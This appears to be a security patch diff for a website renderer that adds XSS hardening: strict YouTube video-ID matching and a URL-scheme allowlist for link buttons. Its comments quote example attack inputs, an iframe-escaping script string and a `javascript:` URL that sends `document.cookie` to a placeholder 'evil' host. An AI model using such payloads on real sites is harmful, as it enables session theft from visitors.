@@ -105,13 +105,18 @@ function decodeImages(basePath) {
 
 // Extract YouTube video ID from various URL formats
 function extractYouTubeVideoId(url) {
+  // Constrain the capture to YouTube's canonical 11-char id format
+  // ([A-Za-z0-9_-]{11}) so a malicious "URL" like
+  // `youtu.be/X"></iframe><script>...` can't escape the iframe src
+  // attribute when the result is interpolated into HTML. The loose
+  // `[^&\n?#]+` capture this replaces accepted `<>"` etc. verbatim.
   const patterns = [
-    /(?:youtube\.com\/watch\?v=|youtube\.com\/embed\/|youtu\.be\/|youtube\.com\/v\/|youtube\.com\/watch\?.*&v=)([^&\n?#]+)/,
-    /^([a-zA-Z0-9_-]{11})$/, // Just the video ID
+    /(?:youtube\.com\/watch\?v=|youtube\.com\/embed\/|youtu\.be\/|youtube\.com\/v\/|youtube\.com\/watch\?[^#]*&v=)([A-Za-z0-9_-]{11})(?![A-Za-z0-9_-])/,
+    /^([A-Za-z0-9_-]{11})$/, // Just the video ID
   ];
   for (const pattern of patterns) {
-    const match = url.match(pattern);
-    if (match) {
+    const match = (url || "").match(pattern);
+    if (match && /^[A-Za-z0-9_-]{11}$/.test(match[1])) {
       return match[1];
     }
   }
@@ -176,14 +181,19 @@ function decodeEmbeds(basePath) {
       const parts = linkButtonContent.split('|');
       const url = parts[0] || '';
       const label = parts[1] || 'Link';
-      const isExternal = url.startsWith('https://');
+      // Reject any URL whose scheme isn't on the allowlist. Without this
+      // a malicious page author (or collaborator on someone else's site)
+      // could plant `javascript:fetch('//evil/?'+document.cookie)` and
+      // execute script in every visitor's session when they click.
+      const safeUrl = isSafeButtonUrl(url) ? url : "#";
+      const isExternal = safeUrl.startsWith('https://');
       const icon = isExternal ? '🌐' : '🔗';
 
       const buttonContainer = document.createElement("div");
       buttonContainer.classList.add("link-button-container");
 
       const linkButton = document.createElement("a");
-      linkButton.href = url;
+      linkButton.href = safeUrl;
       linkButton.classList.add("link-button");
       if (isExternal) {
         linkButton.setAttribute("target", "_blank");
@@ -1095,6 +1105,23 @@ function escapeHtml(text) {
   const div = document.createElement("div");
   div.textContent = text;
   return div.innerHTML;
+}
+
+// URL-scheme allowlist for the link-button code-block. Markdown links
+// in the body are sanitized by DOMPurify (which strips javascript: by
+// default), but link buttons are constructed via direct property
+// assignment (linkButton.href = url) which bypasses that — so we
+// validate the scheme here instead. Permitted: absolute http(s),
+// mailto:, fragment-only (#), and relative paths (/, ./, ../).
+function isSafeButtonUrl(url) {
+  if (typeof url !== "string") return false;
+  const trimmed = url.trim();
+  if (!trimmed) return false;
+  if (/^https?:\/\//i.test(trimmed)) return true;
+  if (/^mailto:/i.test(trimmed)) return true;
+  if (trimmed.startsWith("/") || trimmed.startsWith("#")) return true;
+  if (trimmed.startsWith("./") || trimmed.startsWith("../")) return true;
+  return false;
 }
 
 // Theme toggle functionality. Default to the OS color-scheme preference
